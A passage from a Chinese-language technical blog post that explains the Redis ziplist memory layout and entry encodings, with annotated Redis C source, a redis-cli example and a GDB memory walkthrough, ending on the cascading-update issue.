<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ZIPLIST_HEADER_SIZE     (sizeof(uint32_t)*2+sizeof(uint16_t)) <span class="comment">// 8 + 2 = 10字节</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIPLIST_END_SIZE        (sizeof(uint8_t)) <span class="comment">// 1字节</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIPLIST_BYTES(zl)       (*((uint32_t*)(zl)))  <span class="comment">// zlbytes</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Create a new empty ziplist. */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *<span class="title function_">ziplistNew</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> bytes = ZIPLIST_HEADER_SIZE+ZIPLIST_END_SIZE;	<span class="comment">// zlbytes = 10 + 1 = 11</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *zl = zmalloc(bytes); <span class="comment">// 可以看出，空表分配11字节大小空间</span></span><br><span class="line">    ZIPLIST_BYTES(zl) = intrev32ifbe(bytes);</span><br><span class="line">    ZIPLIST_TAIL_OFFSET(zl) = intrev32ifbe(ZIPLIST_HEADER_SIZE);</span><br><span class="line">    ZIPLIST_LENGTH(zl) = <span class="number">0</span>;</span><br><span class="line">    zl[bytes<span class="number">-1</span>] = ZIP_END;</span><br><span class="line">    <span class="keyword">return</span> zl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ziplist为空时的内存空间如下图：<br><img data-src="/2021/1230204524/image2.png"></p>
<ul>
<li><code>zltail</code>占4字节，用于记录表尾节点首地址距离ziplist起始地址有多少字节。设计这个字段的目的是为了快速定位表尾节点地址（ZIPLIST_ENTRY_TAIL)。</li>
<li><code>zllen</code>占2字节，用于记录列表节点总数。注意<code>zllen</code>等于65535时，表示这个列表长度太大，必须通过遍历整个ziplist才能得到真实的长度。参考<code>ziplistLen</code>实现：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> UINT16_MAX 65535</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">ziplistLen</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *zl)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (intrev16ifbe(ZIPLIST_LENGTH(zl)) &lt; UINT16_MAX) &#123;</span><br><span class="line">        len = intrev16ifbe(ZIPLIST_LENGTH(zl)); <span class="comment">// zllen &lt; 65535时，O(1)复杂度获取ziplist长度</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> *p = zl+ZIPLIST_HEADER_SIZE;</span><br><span class="line">        <span class="keyword">while</span> (*p != ZIP_END) &#123;			<span class="comment">// zllen = 65535时，O(N)复杂度获取ziplist长度</span></span><br><span class="line">            p += zipRawEntryLength(p);</span><br><span class="line">            len++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Re-store length if small enough */</span></span><br><span class="line">        <span class="keyword">if</span> (len &lt; UINT16_MAX) ZIPLIST_LENGTH(zl) = intrev16ifbe(len);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>zlend</code>占1字节，用于标记ziplist的结束，内容固定为0xFF(十进制的255)</li>
</ul>
<h3><span id="ziplist节点构成">ziplist节点构成<span id="jump2"></span></span></h3><p>ziplist中包含多个节点(entry)，每个节点存储一个字符串值或整数值，每个节点通过struct zlentry结构表示。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">zlentry</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> prevrawlensize; <span class="comment">/* Bytes used to encode the previous entry len*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> prevrawlen;     <span class="comment">/* Previous entry len. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> lensize;        <span class="comment">/* Bytes used to encode this entry type/len.</span></span><br><span class="line"><span class="comment">                                    For example strings have a 1, 2 or 5 bytes</span></span><br><span class="line"><span class="comment">                                    header. Integers always use a single byte.*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> len;            <span class="comment">/* Bytes used to represent the actual entry.</span></span><br><span class="line"><span class="comment">                                    For strings this is just the string length</span></span><br><span class="line"><span class="comment">                                    while for integers it is 1, 2, 3, 4, 8 or</span></span><br><span class="line"><span class="comment">                                    0 (for 4 bit immediate) depending on the</span></span><br><span class="line"><span class="comment">                                    number range. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> headersize;     <span class="comment">/* prevrawlensize + lensize. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> encoding;      <span class="comment">/* Set to ZIP_STR_* or ZIP_INT_* depending on</span></span><br><span class="line"><span class="comment">                                    the entry encoding. However for 4 bits</span></span><br><span class="line"><span class="comment">                                    immediate integers this can assume a range</span></span><br><span class="line"><span class="comment">                                    of values and must be range-checked. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *p;            <span class="comment">/* Pointer to the very start of the entry, that</span></span><br><span class="line"><span class="comment">                                    is, this points to prev-entry-len field. */</span></span><br><span class="line">&#125; zlentry;</span><br></pre></td></tr></table></figure>

<p>前面提到，ziplist本质是一个字节数组，Redis为了操作方便，才专门定义zlentry结构体，并解析某个entry的信息到zlentry中，<strong>注意ziplist字节数组本身并不存储zlentry；</strong> ziplist的每个entry结构都由三部分组成：</p>
<ul>
<li>前一节点长度信息：<code>previous_entry_length</code></li>
<li>当前节点编码信息：<code>encoding</code></li>
<li>当前节点内容：<code>content</code></li>
</ul>
<p>ziplist节点的各组成部分示意图：<br><img data-src="/2021/1230204524/image3.png"></p>
<p>以下分别介绍这三个组成部分：</p>
<h4><span id="1-前一节点长度信息-previous_entry_length">1、前一节点长度信息 previous_entry_length</span></h4><p><code>previous_entry_length</code>本身占1字节或5字节，用于记录前一个节点的长度，单位为字节：</p>
<ul>
<li>如果前一个节点长度小于254字节，<code>previous_entry_length</code>就只占1字节，直接保存前一个节点长度。</li>
<li>如果前一个节点长度大于等于254字节，<code>previous_entry_length</code>就占5字节，其中第一个字节固定为0xFE，后4个字节保存前一个节点长度。</li>
</ul>
<p>源码参考<code>ZIP_DECODE_PREVLENSIZE</code>，这个宏根据前一个节点长度，返回<code>previous_entry_length</code>占用的字节数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_BIG_PREVLEN 254</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_DECODE_PREVLENSIZE(ptr, prevlensize) do &#123;                          \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> ((ptr)[0] &lt; ZIP_BIG_PREVLEN) &#123;                                          \</span></span><br><span class="line"><span class="meta">        (prevlensize) = 1;                                                     \</span></span><br><span class="line"><span class="meta">    &#125; <span class="keyword">else</span> &#123;                                                                   \</span></span><br><span class="line"><span class="meta">        (prevlensize) = 5;                                                     \</span></span><br><span class="line"><span class="meta">    &#125;                                                                          \</span></span><br><span class="line"><span class="meta">&#125; while(0)</span></span><br></pre></td></tr></table></figure>

<p>Q：为什么要设计<code>previous_entry_length</code>字段，有什么作用？</p>
<p>A：用于支持从表尾向表头方向遍历。比如我们有指向某个节点起始地址的指针p，用p减去这个节点的<code>previous_entry_length</code>，就能得到前一节点的起始地址。</p>
<p>访问ziplist当前节点的前一个节点，参考源码<code>ziplistPrev</code>的实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Return pointer to previous entry in ziplist. */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *<span class="title function_">ziplistPrev</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *zl, <span class="type">unsigned</span> <span class="type">char</span> *p)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> prevlensize, prevlen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (p[<span class="number">0</span>] == ZIP_END) &#123;	<span class="comment">// p指向ZIPLIST_ENTRY_END，前一个节点就是最后一个节点，即ZIPLIST_ENTRY_TAIL</span></span><br><span class="line">        p = ZIPLIST_ENTRY_TAIL(zl);</span><br><span class="line">        <span class="keyword">return</span> (p[<span class="number">0</span>] == ZIP_END) ? <span class="literal">NULL</span> : p;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (p == ZIPLIST_ENTRY_HEAD(zl)) &#123;	<span class="comment">// p为表头，说明前一个节点为NULL</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ZIP_DECODE_PREVLEN(p, prevlensize, prevlen);	<span class="comment">// p减去这个节点的previous_entry_length</span></span><br><span class="line">        assert(prevlen &gt; <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> p-prevlen;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="2-当前节点编码信息-encoding当前节点内容content">2、当前节点编码信息 encoding，当前节点内容content</span></h4><p> <code>encoding</code>用于记录当前节点内容的实际类型（字符串还是整数），以及长度：</p>
<ul>
<li><code>encoding</code>长度可以是1字节、2字节、或5字节。其中<code>encoding</code>最高两位为00, 01, 或10时表示存储的值类型为字符串；<code>encoding</code>最高两位为11表示存储的值类型为整数。</li>
</ul>
<p>每一种<code>encoding</code>对应的编码长度和content类型，参考如下源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ziplist.c</span></span><br><span class="line"><span class="comment">/* Different encoding/length possibilities */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_STR_MASK 0xc0			<span class="comment">// 11000000</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_INT_MASK 0x30			<span class="comment">// 00110000</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_STR_06B (0 &lt;&lt; 6)		<span class="comment">// 00bbbbbb （长度小于等于63）</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_STR_14B (1 &lt;&lt; 6)		<span class="comment">// 01bbbbbb bbbbbbbb  (长度大于63且小于等于16383)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_STR_32B (2 &lt;&lt; 6)		<span class="comment">// 10______ bbbbbbbb bbbbbbbb bbbbbbbb bbbbbbbb（长度大于16384）</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_INT_16B (0xc0 | 0&lt;&lt;4)	<span class="comment">// 11000000  16位整数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_INT_32B (0xc0 | 1&lt;&lt;4)	<span class="comment">// 11010000  32位整数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_INT_64B (0xc0 | 2&lt;&lt;4)	<span class="comment">// 11100000  64位整数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_INT_24B (0xc0 | 3&lt;&lt;4)	<span class="comment">// 11110000  24位整数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_INT_8B 0xfe				<span class="comment">// 11111110  8位整数</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 4 bit integer immediate encoding |1111xxxx| with xxxx between</span></span><br><span class="line"><span class="comment"> * 0001 and 1101. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_INT_IMM_MASK 0x0f   <span class="comment">/* Mask to extract the 4 bits value. To add</span></span></span><br><span class="line"><span class="comment"><span class="meta">                                   one is needed to reconstruct the value. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_INT_IMM_MIN 0xf1    <span class="comment">/* 11110001 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_INT_IMM_MAX 0xfd    <span class="comment">/* 11111101 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INT24_MAX 0x7fffff</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INT24_MIN (-INT24_MAX - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Macro to determine if the entry is a string. String entries never start</span></span><br><span class="line"><span class="comment"> * with &quot;11&quot; as most significant bits of the first byte. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_IS_STR(enc) (((enc) &amp; ZIP_STR_MASK) &lt; ZIP_STR_MASK)  <span class="comment">// 判断是否为字节数组编码！！！</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Extract the encoding from the byte pointed by &#x27;ptr&#x27; and set it into</span></span><br><span class="line"><span class="comment"> * &#x27;encoding&#x27; field of the zlentry structure. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_ENTRY_ENCODING(ptr, encoding) do &#123;  \</span></span><br><span class="line"><span class="meta">    (encoding) = (ptr[0]); \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> ((encoding) &lt; ZIP_STR_MASK) (encoding) &amp;= ZIP_STR_MASK; \</span></span><br><span class="line"><span class="meta">&#125; while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Decode the entry encoding type and data length (string length for strings,</span></span><br><span class="line"><span class="comment"> * number of bytes used for the integer for integer entries) encoded in &#x27;ptr&#x27;.</span></span><br><span class="line"><span class="comment"> * The &#x27;encoding&#x27; variable will hold the entry encoding, the &#x27;lensize&#x27;</span></span><br><span class="line"><span class="comment"> * variable will hold the number of bytes required to encode the entry</span></span><br><span class="line"><span class="comment"> * length, and the &#x27;len&#x27; variable will hold the entry length. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_DECODE_LENGTH(ptr, encoding, lensize, len) do &#123;                    \</span></span><br><span class="line"><span class="meta">    ZIP_ENTRY_ENCODING((ptr), (encoding));                                     \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> ((encoding) &lt; ZIP_STR_MASK) &#123;                                           \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> ((encoding) == ZIP_STR_06B) &#123;                                       \</span></span><br><span class="line"><span class="meta">            (lensize) = 1;                                                     \</span></span><br><span class="line"><span class="meta">            (len) = (ptr)[0] &amp; 0x3f;                                           \</span></span><br><span class="line"><span class="meta">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((encoding) == ZIP_STR_14B) &#123;                                \</span></span><br><span class="line"><span class="meta">            (lensize) = 2;                                                     \</span></span><br><span class="line"><span class="meta">            (len) = (((ptr)[0] &amp; 0x3f) &lt;&lt; 8) | (ptr)[1];                       \</span></span><br><span class="line"><span class="meta">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((encoding) == ZIP_STR_32B) &#123;                                \</span></span><br><span class="line"><span class="meta">            (lensize) = 5;                                                     \</span></span><br><span class="line"><span class="meta">            (len) = ((ptr)[1] &lt;&lt; 24) |                                         \</span></span><br><span class="line"><span class="meta">                    ((ptr)[2] &lt;&lt; 16) |                                         \</span></span><br><span class="line"><span class="meta">                    ((ptr)[3] &lt;&lt;  8) |                                         \</span></span><br><span class="line"><span class="meta">                    ((ptr)[4]);                                                \</span></span><br><span class="line"><span class="meta">        &#125; <span class="keyword">else</span> &#123;                                                               \</span></span><br><span class="line"><span class="meta">            panic(<span class="string">&quot;Invalid string encoding 0x%02X&quot;</span>, (encoding));               \</span></span><br><span class="line"><span class="meta">        &#125;                                                                      \</span></span><br><span class="line"><span class="meta">    &#125; <span class="keyword">else</span> &#123;                                                                   \</span></span><br><span class="line"><span class="meta">        (lensize) = 1;                                                         \</span></span><br><span class="line"><span class="meta">        (len) = zipIntSize(encoding);                                          \</span></span><br><span class="line"><span class="meta">    &#125;                                                                          \</span></span><br><span class="line"><span class="meta">&#125; while(0)</span></span><br></pre></td></tr></table></figure>

<p>整数编码：</p>
<table>
<thead>
<tr>
<th align="left">encoding</th>
<th align="left">encoding长度</th>
<th align="left">content长度</th>
</tr>
</thead>
<tbody><tr>
<td align="left">11111110 (ZIP_INT_8B)</td>
<td align="left">1字节</td>
<td align="left">8位整数</td>
</tr>
<tr>
<td align="left">11000000 (ZIP_INT_16B)</td>
<td align="left">1字节</td>
<td align="left">16位整数</td>
</tr>
<tr>
<td align="left">11110000(ZIP_INT_24B)</td>
<td align="left">1字节</td>
<td align="left">24位整数</td>
</tr>
<tr>
<td align="left">11010000(ZIP_INT_32B)</td>
<td align="left">1字节</td>
<td align="left">32位整数</td>
</tr>
<tr>
<td align="left">11100000(ZIP_INT_64B)</td>
<td align="left">1字节</td>
<td align="left">64位整数</td>
</tr>
<tr>
<td align="left">1111xxxx</td>
<td align="left">1字节</td>
<td align="left">0-12之间的整数。此时没有content部分，值存储在encoding的xxxx四个位</td>
</tr>
</tbody></table>
<p>字节数组编码：</p>
<table>
<thead>
<tr>
<th align="left">encoding</th>
<th align="left">encoding说明</th>
<th align="left">encoding长度</th>
<th align="left">content长度</th>
</tr>
</thead>
<tbody><tr>
<td align="left">00xxxxxx (ZIP_STR_06B)</td>
<td align="left">后6位表示字节数组的长度</td>
<td align="left">1字节</td>
<td align="left">保存长度小于等于63字节的字节数组</td>
</tr>
<tr>
<td align="left">01xxxxxx xxxxxxxx (ZIP_STR_14B)</td>
<td align="left">后14位表示字节数组的长度</td>
<td align="left">2字节</td>
<td align="left">保存长度大于63， 小于等于16383字节的字节数组</td>
</tr>
<tr>
<td align="left">10______ xxxxxxxx xxxxxxxx xxxxxxxx xxxxxxxx (ZIP_STR_32B)</td>
<td align="left">最后24位表示字节数组的长度，第3-8位留空</td>
<td align="left">5字节</td>
<td align="left">保存长度大于16384，小于 2^32 - 1字节的字节数组</td>
</tr>
</tbody></table>
<p>总结：Redis根据ziplist节点存储内容的类型和大小，使用不同的编码表示，目的在于最大限度地节省空间。</p>
<p><font color="red">思考问题：</font>创建一个ziplist编码的空列表键，并依次添加两个值”hello”，”10086”，问此时ziplist的长度是多少，内容是什么样的？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; info  # Redis版本必须为3.2之前的，否则列表键的默认编码为quicklist，而非ziplist!</span><br><span class="line"># Server redis_version:3.0.0</span><br><span class="line">127.0.0.1:6379&gt; flushdb</span><br><span class="line">127.0.0.1:6379&gt; rpush key hello 10086 # 新增列表键，依次插入两个key &quot;hello&quot; &quot;10086&quot;</span><br><span class="line">(integer) 2</span><br><span class="line">127.0.0.1:6379&gt; object encoding key   # 确认列表键编码为ziplist</span><br><span class="line">&quot;ziplist&quot;</span><br></pre></td></tr></table></figure>

<p>如果你真的掌握了ziplist节点构成，那么不需要运行Redis，你也可以得出答案：这个ziplist占用22字节，内存如下图所示：<br><img data-src="/2021/1230204524/image4.png"><br>以下给出GDB的验证方法和验证结果，感兴趣的可以参考：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 0、确认ziplist的首地址</span></span><br><span class="line">(gdb) p (sds)server.db[<span class="number">0</span>].dict.ht[<span class="number">0</span>].table[<span class="number">3</span>].key</span><br><span class="line">$<span class="number">1</span> = (sds) <span class="number">0x7fc6ac086288</span> <span class="string">&quot;key&quot;</span> <span class="comment">// 键</span></span><br><span class="line">(gdb) p *(robj *)server.db[<span class="number">0</span>].dict.ht[<span class="number">0</span>].table[<span class="number">3</span>].v</span><br><span class="line">$<span class="number">2</span> = &#123;type = <span class="number">1</span>, encoding = <span class="number">5</span>, lru = <span class="number">13392586</span>, refcount = <span class="number">1</span>, ptr = <span class="number">0x7fc6ac035d60</span>&#125; <span class="comment">// ptr即为ziplist的首地址！</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1、打印zlbytes, zltail, zllen</span></span><br><span class="line">(gdb) p *(<span class="type">int</span> *)<span class="number">0x7fc6ac035d60</span></span><br><span class="line">$<span class="number">3</span> = <span class="number">22</span> <span class="comment">// zlbytes = 22</span></span><br><span class="line">(gdb) p *(<span class="type">int</span> *)<span class="number">0x7fc6ac035d64</span></span><br><span class="line">$<span class="number">4</span> = <span class="number">17</span> <span class="comment">// zltail = 17</span></span><br><span class="line">(gdb) p *(<span class="type">short</span> *)<span class="number">0x7fc6ac035d68</span></span><br><span class="line">$<span class="number">5</span> = <span class="number">2</span>  <span class="comment">// zlen = 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、以下开始打印第一个节点</span></span><br><span class="line">(gdb) x/xb <span class="number">0x7fc6ac035d6a</span></span><br><span class="line"><span class="number">0x7fc6ac035d6a</span>: <span class="number">0x00</span> <span class="comment">// previous_entry_length本身占1字节，长度为0</span></span><br><span class="line">(gdb) x/xb <span class="number">0x7fc6ac035d6b</span></span><br><span class="line"><span class="number">0x7fc6ac035d6b</span>: <span class="number">0x05</span> <span class="comment">// encoding为00000101, 本身占1字节，表示长度为5的字节数组</span></span><br><span class="line">(gdb) x/<span class="number">5</span>c <span class="number">0x7fc6ac035d6c</span></span><br><span class="line"><span class="number">0x7fc6ac035d6c</span>: <span class="number">104</span> <span class="string">&#x27;h&#x27;</span> <span class="number">101</span> <span class="string">&#x27;e&#x27;</span> <span class="number">108</span> <span class="string">&#x27;l&#x27;</span> <span class="number">108</span> <span class="string">&#x27;l&#x27;</span> <span class="number">111</span> <span class="string">&#x27;o&#x27;</span>	<span class="comment">// content占5字节，存储&quot;hello&quot;</span></span><br><span class="line"><span class="comment">// 第一个节点总长度为 1 + 1 + 5 = 7 字节</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3、以下开始打印第二个节点</span></span><br><span class="line">(gdb) x/xb <span class="number">0x7fc6ac035d71</span></span><br><span class="line"><span class="number">0x7fc6ac035d71</span>: <span class="number">0x07</span> <span class="comment">// previous_entry_length本身占1字节，长度为7</span></span><br><span class="line">(gdb) x/xb <span class="number">0x7fc6ac035d72</span></span><br><span class="line"><span class="number">0x7fc6ac035d72</span>: <span class="number">0xc0</span> <span class="comment">// encoding为11000000, 本身占1字节, 表示16位的整数</span></span><br><span class="line">(gdb) p *(<span class="type">short</span> *) <span class="number">0x7fc6ac035d73</span></span><br><span class="line">$<span class="number">6</span> = <span class="number">10086</span>	<span class="comment">// content本身占2字节，存储内容正是10086</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4、标志zlend，占1字节</span></span><br><span class="line">(gdb) x/xb <span class="number">0x7fc6ac035d75</span></span><br><span class="line"><span class="number">0x7fc6ac035d75</span>: <span class="number">0xff</span></span><br></pre></td></tr></table></figure>

<h3><span id="为什么要设计ziplist">为什么要设计ziplist<span id="jump3"></span></span></h3><p>还是考虑这个列表键： <code>&quot;hello&quot; -&gt; &quot;10086&quot;</code></p>
<ul>
<li>如果用ziplist编码，仅需22个字节存储。</li>
<li>如果用linkedlist编码，以64位环境为例，光链表节点就需要2 * sizeof(listNode) &#x3D; 48个字节，这个大小远超过了数据本身的大小，导致严重的内存浪费。</li>
</ul>
<p>可以看出，ziplist设计思想是以时间换空间，目的是节省宝贵的内存资源。</p>
<p>Redis中，ziplist是列表键和哈希键的底层实现之一，也用于quicklist的实现。</p>
<h3><span id="ziplist相关操作">ziplist相关操作<span id="jump4"></span></span></h3><p>压缩列表的增、删、改、查API如下：</p>
<table>
<thead>
<tr>
<th align="left">API</th>
<th align="left">功能</th>
<th align="left">时间复杂度</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ziplistPush</td>
<td align="left">插入指定节点到表头或表尾</td>
<td align="left">平均O(N)，连锁更新场景为O(N^2)</td>
</tr>
<tr>
<td align="left">ziplistDelete</td>
<td align="left">删除指定节点</td>
<td align="left">平均O(N)，连续更新场景为O(N^2)</td>
</tr>
<tr>
<td align="left">ziplistFind</td>
<td align="left">查找指定节点</td>
<td align="left">O(N^2)，因为节点值可能是字符串，而字符串比较复杂度为O(N)</td>
</tr>
<tr>
<td align="left">ziplistNext</td>
<td align="left">返回给定节点的下一个节点</td>
<td align="left">O(1)</td>
</tr>
<tr>
<td align="left">ziplistPrev</td>
<td align="left">返回给定节点的前一个节点</td>
<td align="left">O(1)</td>
</tr>
</tbody></table>
<h4><span id="查找指定节点">查找指定节点<span id="jump5"></span></span></h4><p>源码参考<code>ziplistFind</code>，时间复杂度为O(N^2)，因为节点值可能是字符串，而字符串比较复杂度为O(N)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 功能：寻找ziplist中，节点值和vstr相等的节点并返回</span></span><br><span class="line"><span class="comment">// skip表示跳过的节点数</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *<span class="title function_">ziplistFind</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *p, <span class="type">unsigned</span> <span class="type">char</span> *vstr, <span class="type">unsigned</span> <span class="type">int</span> vlen, <span class="type">unsigned</span> <span class="type">int</span> skip)</span> &#123;</span><br><span class="line">    <span class="type">int</span> skipcnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> vencoding = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> vll = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (p[<span class="number">0</span>] != ZIP_END) &#123;	<span class="comment">// 如果没有达到列表尾，就一直循环遍历！</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> prevlensize, encoding, lensize, len;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> *q;</span><br><span class="line"></span><br><span class="line">        ZIP_DECODE_PREVLENSIZE(p, prevlensize);</span><br><span class="line">        ZIP_DECODE_LENGTH(p + prevlensize, encoding, lensize, len);</span><br><span class="line">        q = p + prevlensize + lensize;	<span class="comment">// 此时q指向节点p的content</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (skipcnt == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* Compare current entry with specified entry */</span></span><br><span class="line">            <span class="keyword">if</span> (ZIP_IS_STR(encoding)) &#123;	<span class="comment">// 如果是字符串，memcmp比较是否相等，复杂度O(N)</span></span><br><span class="line">                <span class="keyword">if</span> (len == vlen &amp;&amp; <span class="built_in">memcmp</span>(q, vstr, vlen) == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> p;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">/* Find out if the searched field can be encoded. Note that</span></span><br><span class="line"><span class="comment">                 * we do it only the first time, once done vencoding is set</span></span><br><span class="line"><span class="comment">                 * to non-zero and vll is set to the integer value. */</span></span><br><span class="line">                <span class="comment">// 对于传入的vstr, 解码动作只需做一次， vencoding相当于一个flag</span></span><br><span class="line">                <span class="keyword">if</span> (vencoding == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!zipTryEncoding(vstr, vlen, &amp;vll, &amp;vencoding)) &#123;</span><br><span class="line">                        <span class="comment">/* If the entry can&#x27;t be encoded we set it to</span></span><br><span class="line"><span class="comment">                         * UCHAR_MAX so that we don&#x27;t retry again the next</span></span><br><span class="line"><span class="comment">                         * time. */</span></span><br><span class="line">                        vencoding = UCHAR_MAX;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">/* Must be non-zero by now */</span></span><br><span class="line">                    assert(vencoding);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* Compare current entry with specified entry, do it only</span></span><br><span class="line"><span class="comment">                 * if vencoding != UCHAR_MAX because if there is no encoding</span></span><br><span class="line"><span class="comment">                 * possible for the field it can&#x27;t be a valid integer. */</span></span><br><span class="line">                <span class="comment">// 如果解码成功，比较整数值是否相等</span></span><br><span class="line">                <span class="keyword">if</span> (vencoding != UCHAR_MAX) &#123;</span><br><span class="line">                    <span class="type">long</span> <span class="type">long</span> ll = zipLoadInteger(q, encoding);</span><br><span class="line">                    <span class="keyword">if</span> (ll == vll) &#123;</span><br><span class="line">                        <span class="keyword">return</span> p;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Reset skip count */</span></span><br><span class="line">            skipcnt = skip;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* Skip entry */</span></span><br><span class="line">            skipcnt--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Move to next entry */</span></span><br><span class="line">        <span class="comment">// q指向content, len就是content的长度, 所以 q + len即为下一个节点的首地址！！</span></span><br><span class="line">        p = q + len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="连锁更新问题">连锁更新问题<span id="jump6"></span></span></h4><p>前面提到，ziplist中每个节点的<code>previous_entry_length</code>记录了前一个节点的长度，考虑在表头插入节点的场景：</p>
<p>如果列表所有节点长度都在250-253字节之前，且插入节点大于等于254字节，就会导致所有节点的<code>previous_entry_length</code>都必须从1字节扩展为5字节, 即触发了<strong>连锁更新</strong>。</p>
